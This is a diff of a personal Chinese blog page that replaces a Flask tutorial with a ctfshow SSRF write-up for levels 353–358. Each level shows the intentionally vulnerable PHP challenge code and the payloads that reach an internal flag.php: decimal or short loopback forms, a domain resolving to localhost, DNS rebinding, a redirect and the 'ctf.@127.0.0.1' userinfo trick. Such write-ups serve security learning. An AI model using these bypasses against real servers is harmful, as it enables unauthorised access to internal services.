-<p>这是将此文件作为Flask的模板，我们也可以引入其他文件作为模板</p>
-<p>静态文件（如 CSS、JavaScript、图片）可以通过 static 路由访问。模板文件则通过 templates 文件夹组织，用于渲染 HTML 页面。</p>
-<p>静态文件访问:</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;link rel=<span class="string">&quot;stylesheet&quot;</span> href=<span class="string">&quot;&#123;&#123; url_for(&#x27;static&#x27;, filename=&#x27;style.css&#x27;) &#125;&#125;&quot;</span>&gt;</span><br></pre></td></tr></table></figure>
+<p>这题没有什么就是把localhost和127.0.0.1给过滤掉了，我们只需要进制绕过即可</p>
+<h3 id="2-353关"><a href="#2-353关" class="headerlink" title="2.353关"></a>2.353关</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$url</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line"><span class="variable">$x</span>=<span class="title function_ invoke__">parse_url</span>(<span class="variable">$url</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$x</span>[<span class="string">&#x27;scheme&#x27;</span>]===<span class="string">&#x27;http&#x27;</span>||<span class="variable">$x</span>[<span class="string">&#x27;scheme&#x27;</span>]===<span class="string">&#x27;https&#x27;</span>)&#123;</span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/localhost|127\.0\.|\。/i&#x27;</span>, <span class="variable">$url</span>))&#123;</span><br><span class="line"><span class="variable">$ch</span>=<span class="title function_ invoke__">curl_init</span>(<span class="variable">$url</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_HEADER, <span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line"><span class="variable">$result</span>=<span class="title function_ invoke__">curl_exec</span>(<span class="variable">$ch</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_close</span>(<span class="variable">$ch</span>);</span><br><span class="line"><span class="keyword">echo</span> (<span class="variable">$result</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;hacker&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;hacker&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>
 
-<p>这和文件包含类似，相当于包含了style.css文件</p>
-<p>实例:</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> render_template</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/hello/&lt;name&gt;&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hello</span>(<span class="params">name</span>):</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;hello.html&#x27;</span>, name=name)</span><br></pre></td></tr></table></figure>
+<p>我们还是一样，使用进制绕过和域名绕过</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url=http:<span class="comment">//sudo.cc/flag.php</span></span><br></pre></td></tr></table></figure>
 
-<p>渲染html页面</p>
-<p><strong>8.路由优先级</strong></p>
-<p>Flask 按照定义的顺序匹配路由，第一个匹配成功的路由将被处理。确保更具体的路由放在更一般的路由之前。</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/user/&lt;int:user_id&gt;&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">user_profile</span>(<span class="params">user_id</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="string">f&#x27;User ID: <span class="subst">&#123;user_id&#125;</span>&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/user&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">user_list</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;User List&#x27;</span></span><br></pre></td></tr></table></figure>
 
-<p>如果带参数则匹配第一个路由，不带参数则匹配第二个路由</p>
-<h2 id="5-Flask-视图函数"><a href="#5-Flask-视图函数" class="headerlink" title="5.Flask 视图函数"></a>5.Flask 视图函数</h2><p>不知道为什么这个要叫视图函数，我认为和普通的python函数差不多，以前也了解了一些基础知识，所以只学其他的</p>
-<p>视图函数是 Flask 应用中的核心部分，它负责处理请求并生成响应。</p>
-<p>视图函数与路由紧密结合，通过路由将 URL 映射到具体的视图函数。</p>
-<p>以下是对 Flask 视图函数的详细说明，包括如何定义、使用请求数据、返回响应、以及如何处理错误等。</p>
-<ol>
-<li><strong>定义视图函数</strong>：视图函数是处理请求并返回响应的核心功能。</li>
-<li><strong>接收请求数据</strong>：使用 <code>request</code> 对象获取 URL 参数、表单数据、查询参数等。</li>
-<li><strong>返回响应</strong>：可以返回字符串、HTML、JSON 或自定义响应对象。</li>
-<li><strong>处理请求和响应</strong>：使用 <code>request</code> 对象和 <code>make_response</code> 来处理请求和生成自定义响应。</li>
-<li><strong>处理错误</strong>：视图函数内处理异常或使用 Flask 的错误处理机制。</li>
-<li><strong>视图函数的装饰器</strong>：使用 <code>@app.before_request</code>、<code>@app.after_request</code> 等装饰器处理请求前后逻辑。</li>
-<li><strong>视图函数返回的状态码</strong>：可以指定 HTTP 状态码来表示请求的处理结果。</li>
-</ol>
-<p><strong>1.处理请求和响应</strong></p>
-<p>视图函数可以访问请求对象，并根据请求数据生成响应。可以使用 request 对象来获取请求的信息，使用 make_response 来创建自定义响应。</p>
-<p>使用 request 对象：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> request</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/info&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">info</span>():</span><br><span class="line">    user_agent = request.headers.get(<span class="string">&#x27;User-Agent&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">f&#x27;Your user agent is <span class="subst">&#123;user_agent&#125;</span>&#x27;</span></span><br><span class="line"><span class="comment">#获取请求头的各种信息</span></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> make_response</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/header&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">custom_header</span>():</span><br><span class="line">    response = make_response(<span class="string">&#x27;Response with custom header&#x27;</span>)</span><br><span class="line">    response.headers[<span class="string">&#x27;X-Custom-Header&#x27;</span>] = <span class="string">&#x27;Value&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> response</span><br><span class="line"><span class="comment">#我们通过make_response创建自定义响应</span></span><br></pre></td></tr></table></figure>
 
-<p><strong>2.处理错误</strong></p>
-<p>可以在视图函数中处理异常或错误，或者通过 Flask 提供的错误处理机制来处理应用中的错误。</p>
-<p>在视图函数中处理错误:</p>
-<p>实例:</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/divide/&lt;int:x&gt;/&lt;int:y&gt;&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">divide</span>(<span class="params">x, y</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        result = x / y</span><br><span class="line">        <span class="keyword">return</span> <span class="string">f&#x27;Result: <span class="subst">&#123;result&#125;</span>&#x27;</span></span><br><span class="line">    <span class="keyword">except</span> ZeroDivisionError:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;Error: Division by zero&#x27;</span>, <span class="number">400</span></span><br><span class="line"><span class="comment">#使用 try-except 语句处理除零错误，并返回自定义错误消息和状态码。</span></span><br><span class="line"><span class="comment">#全局错误处理:</span></span><br><span class="line"><span class="meta">@app.errorhandler(<span class="params"><span class="number">404</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">not_found</span>(<span class="params">error</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;Page not found&#x27;</span>, <span class="number">404</span></span><br><span class="line"><span class="comment">#@app.errorhandler(404)：定义处理 404 错误的函数。</span></span><br></pre></td></tr></table></figure>
+<h3 id="3-356关"><a href="#3-356关" class="headerlink" title="3.356关"></a>3.356关</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$url</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line"><span class="variable">$x</span>=<span class="title function_ invoke__">parse_url</span>(<span class="variable">$url</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$x</span>[<span class="string">&#x27;scheme&#x27;</span>]===<span class="string">&#x27;http&#x27;</span>||<span class="variable">$x</span>[<span class="string">&#x27;scheme&#x27;</span>]===<span class="string">&#x27;https&#x27;</span>)&#123;</span><br><span class="line"><span class="variable">$host</span>=<span class="variable">$x</span>[<span class="string">&#x27;host&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>((<span class="title function_ invoke__">strlen</span>(<span class="variable">$host</span>)&lt;=<span class="number">3</span>))&#123;</span><br><span class="line"><span class="variable">$ch</span>=<span class="title function_ invoke__">curl_init</span>(<span class="variable">$url</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_HEADER, <span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line"><span class="variable">$result</span>=<span class="title function_ invoke__">curl_exec</span>(<span class="variable">$ch</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_close</span>(<span class="variable">$ch</span>);</span><br><span class="line"><span class="keyword">echo</span> (<span class="variable">$result</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;hacker&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;hacker&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span> ctfshow&#123;d7e37e06-<span class="number">027</span>b-<span class="number">4303</span>-<span class="number">90</span>c5-<span class="number">3</span>de44504b7bc&#125;</span><br></pre></td></tr></table></figure>
 
-<p><strong>3.视图函数的装饰器</strong></p>
-<p>除了 @app.route，Flask 还支持其他装饰器，用于实现更复杂的功能。</p>
-<p>示例：</p>
-<ul>
-<li>**<code>@app.before_request</code>**：在每个请求处理之前运行的函数。</li>
-<li>**<code>@app.after_request</code>**：在每个请求处理之后运行的函数。</li>
-<li>**<code>@app.teardown_request</code>**：在请求结束后运行的函数，用于清理工作。</li>
-</ul>
-<p>示例装饰器使用：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.before_request</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">before_request</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;Before request&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.after_request</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">after_request</span>(<span class="params">response</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;After request&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> response</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.teardown_request</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">teardown_request</span>(<span class="params">exception</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;Teardown request&#x27;</span>)</span><br></pre></td></tr></table></figure>
+<p>这个题目限制我们长度为3，我们直接0.0绕过</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">url=http:<span class="comment">//0.0/flag.php</span></span><br><span class="line">相当于<span class="number">127.0</span>.<span class="number">0.1</span></span><br></pre></td></tr></table></figure>
 
-<p><strong>4.视图函数返回的状态码</strong></p>
-<p>视图函数不仅可以返回内容，还可以指定 HTTP 状态码。</p>
-<p>实例：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/status&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">status</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;Everything is OK&#x27;</span>, <span class="number">200</span></span><br><span class="line"><span class="comment">#返回状态码 200 表示请求成功。</span></span><br><span class="line"><span class="comment">#返回带有状态码的响应对象：</span></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Response</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/error&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">error</span>():</span><br><span class="line">    <span class="keyword">return</span> Response(<span class="string">&#x27;An error occurred&#x27;</span>, status=<span class="number">500</span>)</span><br></pre></td></tr></table></figure>
+<h3 id="4-357关"><a href="#4-357关" class="headerlink" title="4.357关"></a>4.357关</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$url</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line"><span class="variable">$x</span>=<span class="title function_ invoke__">parse_url</span>(<span class="variable">$url</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$x</span>[<span class="string">&#x27;scheme&#x27;</span>]===<span class="string">&#x27;http&#x27;</span>||<span class="variable">$x</span>[<span class="string">&#x27;scheme&#x27;</span>]===<span class="string">&#x27;https&#x27;</span>)&#123;</span><br><span class="line"><span class="variable">$ip</span> = <span class="title function_ invoke__">gethostbyname</span>(<span class="variable">$x</span>[<span class="string">&#x27;host&#x27;</span>]);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;/br&gt;&#x27;</span>.<span class="variable">$ip</span>.<span class="string">&#x27;&lt;/br&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">filter_var</span>(<span class="variable">$ip</span>, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE)) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;ip!&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;scheme&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>
 
+<p>这一关讲dns解析绕过的时候已经讲过了，但还是写下payload</p>
+<p>主要思路就是去试试，当第一次解析为公网ip，访问时解析为127.0.0.1的时候就能访问到flag.php</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url=http://7f000001.761fa804.rbndr.us/flag.php</span><br></pre></td></tr></table></figure>
+
+<p>我们当然也可以使用302重定向，不知道为什么这题就可以正常用了</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url=http://ip&#x27;di/index.php</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="5-358关"><a href="#5-358关" class="headerlink" title="5.358关"></a>5.358关</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$url</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line"><span class="variable">$x</span>=<span class="title function_ invoke__">parse_url</span>(<span class="variable">$url</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^http:\/\/ctf\..*show$/i&#x27;</span>,<span class="variable">$url</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$url</span>);</span><br><span class="line">&#125;</span><br><span class="line">ctfshow&#123;<span class="number">326214</span>f4-<span class="number">7</span>ac7-<span class="number">4868</span>-<span class="number">853e-3</span>ccb272081c1&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这题规定我们的url必须以<a target="_blank" rel="noopener" href="http://cft.开始以show结束,不会,直接上payload/">http://cft.开始以show结束，不会，直接上payload</a></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">url=http://ctf.@127.0.0.1/flag.php#show</span><br><span class="line">url=http://ctf.@127.0.0.1/flag.php?show</span><br></pre></td></tr></table></figure>
+
+<p>我们可以通过name@的形式进行绕过，name是用户名，@则是用户名结束的标志，</p>
+<p>至于其他的<code>#show</code> 是URL的片段部分，通常用于指向页面内的特定部分。?show则是GET传参</p>
 
   </div>
   
@@ -2795,10 +2813,10 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
     <div class='new-meta-box'>
       
         
-          <div class="new-meta-item date" itemprop="dateModified" datetime="2025-03-16T17:24:07+08:00">
+          <div class="new-meta-item date" itemprop="dateModified" datetime="2025-03-21T21:17:07+08:00">
   <a class='notlink'>
     <i class="fa-solid fa-edit fa-fw" aria-hidden="true"></i>
-    <p>更新于：Mar 16, 2025</p>
+    <p>更新于：Mar 21, 2025</p>
   </a>
 </div>
 
@@ -2817,7 +2835,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
       
         <a class="-mob-share-qq" title="" rel="external nofollow noopener noreferrer noopener"
           
-          target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://example.com/2025/03/16/Flask/&title=Flask - Hexo&summary="
+          target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://example.com/2025/03/17/SSRF/&title=SSRF - Hexo&summary="
           
           >
           
@@ -2829,7 +2847,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
       
         <a class="-mob-share-qzone" title="" rel="external nofollow noopener noreferrer noopener"
           
-          target="_blank" href="https://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?url=http://example.com/2025/03/16/Flask/&title=Flask - Hexo&summary="
+          target="_blank" href="https://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?url=http://example.com/2025/03/17/SSRF/&title=SSRF - Hexo&summary="
           
           >
           
@@ -2841,7 +2859,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
       
         <a class="-mob-share-weibo" title="" rel="external nofollow noopener noreferrer noopener"
           
-          target="_blank" href="http://service.weibo.com/share/share.php?url=http://example.com/2025/03/16/Flask/&title=Flask - Hexo&summary="
+          target="_blank" href="http://service.weibo.com/share/share.php?url=http://example.com/2025/03/17/SSRF/&title=SSRF - Hexo&summary="
           
           >
           
@@ -2874,6 +2892,13 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
   
     <div class="prev-next">
       
+        <a class='prev' href='/2025/03/18/BaseCTF/'>
+          <p class='title'><i class="fa-solid fa-chevron-left" aria-hidden="true"></i>BaseCTF</p>
+          <p class='content'>BaseCTF2024新生赛前言这学长发给我的一个新手赛，估计和4月份的新生赛差不多，遇到了很多简单的题目，但我还是写不出，就来这写下题解吧
+1.ez_ser简单的反序列化入门，根本不简单
+12...</p>
+        </a>
+      
       
         <a class='next' href='/2025/03/14/%E7%88%86%E7%A0%B4/'>
           <p class='title'>爆破<i class="fa-solid fa-chevron-right" aria-hidden="true"></i></p>
@@ -2893,7 +2918,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
 
   <article class="post white-box shadow floatable blur" id="comments">
     <span hidden>
-      <meta itemprop="discussionUrl" content="/2025/03/16/Flask/index.html#comments">
+      <meta itemprop="discussionUrl" content="/2025/03/17/SSRF/index.html#comments">
     </span>
     <p ct><i class='fa-solid fa-comments'></i> 评论</p>
     
@@ -2935,7 +2960,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
 
 
     <div class='content'>
-        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1-Flask%E7%AE%80%E4%BB%8B"><span class="toc-text">1.Flask简介</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-Hello-World"><span class="toc-text">2.Hello World</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-Flask%E5%9F%BA%E6%9C%AC%E6%A6%82%E5%BF%B5"><span class="toc-text">3.Flask基本概念</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-Flask%E8%B7%AF%E7%94%B1"><span class="toc-text">4.Flask路由</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#5-Flask-%E8%A7%86%E5%9B%BE%E5%87%BD%E6%95%B0"><span class="toc-text">5.Flask 视图函数</span></a></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1-SSRF%E6%BC%8F%E6%B4%9E%E7%AE%80%E4%BB%8B"><span class="toc-text">1.SSRF漏洞简介</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-%E4%BA%A7%E7%94%9FSSRF%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%87%BD%E6%95%B0"><span class="toc-text">2.产生SSRF漏洞的函数</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-file-get-contents"><span class="toc-text">1.file_get_contents:</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-sockopen"><span class="toc-text">2.sockopen():</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-curl-exec"><span class="toc-text">3.curl_exec():</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-%E4%BD%BF%E7%94%A8%E5%88%B0%E7%9A%84url%E5%8D%8F%E8%AE%AE"><span class="toc-text">3.使用到的url协议</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-file-%E5%8D%8F%E8%AE%AE-%E5%AF%BB%E6%89%BE%E4%B8%BB%E6%9C%BA"><span class="toc-text">1.file:&#x2F;&#x2F;协议 寻找主机</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-dict-%E5%8D%8F%E8%AE%AE-%E5%AF%BB%E6%89%BE%E7%AB%AF%E5%8F%A3"><span class="toc-text">2.dict:&#x2F;&#x2F;协议 寻找端口</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-http-%E5%8D%8F%E8%AE%AE-%E6%9F%A5%E7%9C%8B%E9%A1%B5%E9%9D%A2%E4%BF%A1%E6%81%AF"><span class="toc-text">3.http:&#x2F;&#x2F;协议 查看页面信息</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-gopher-%E5%8F%91%E9%80%81POST%E5%92%8CGET%E8%AF%B7%E6%B1%82"><span class="toc-text">4.gopher:&#x2F;&#x2F; 发送POST和GET请求</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-SSRF%E7%BB%95%E8%BF%87"><span class="toc-text">4.SSRF绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E7%8E%AF%E5%9B%9E%E5%9C%B0%E5%9D%80%E7%BB%95%E8%BF%87"><span class="toc-text">1.环回地址绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-302%E9%87%8D%E5%AE%9A%E5%90%91%E7%BB%95%E8%BF%87"><span class="toc-text">2.302重定向绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-DNS%E8%A7%A3%E6%9E%90%E7%BB%95%E8%BF%87"><span class="toc-text">3.DNS解析绕过</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#5-ctfshow"><span class="toc-text">5.ctfshow</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-352%E5%85%B3"><span class="toc-text">1.352关</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-353%E5%85%B3"><span class="toc-text">2.353关</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-356%E5%85%B3"><span class="toc-text">3.356关</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-357%E5%85%B3"><span 